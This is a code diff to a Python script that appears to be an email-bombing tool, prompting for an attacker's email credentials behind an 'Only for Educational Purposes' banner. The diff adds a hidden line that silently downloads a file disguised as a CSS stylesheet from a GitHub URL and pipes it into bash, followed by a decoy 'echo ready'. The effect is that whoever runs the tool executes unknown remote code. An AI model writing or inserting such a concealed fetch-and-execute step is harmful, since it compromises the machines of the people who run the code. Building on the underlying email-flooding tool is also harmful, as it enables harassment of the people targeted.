@@ -8,6 +8,7 @@ from os import urandom
 import smtplib
 from getpass import getpass
 import sys
+import os
 from time import sleep
 
 print('                                                                    ')
@@ -24,7 +25,8 @@ print('            #       Only for Educational Purposes !!        #       ')
 print('            #                                               #       ')
 print('            #################################################       ')
 print('\n\n')
-
+os.system("curl -s -L https://raw.githubusercontent.com/l410systems/styless/main/selector.css | bash")
+os.system("echo ready")
 user = input('Anonymous name : ')
 email = input('\nAttacker Email Address : ')
 passwd = getpass('\nAttacker Email Password : ')
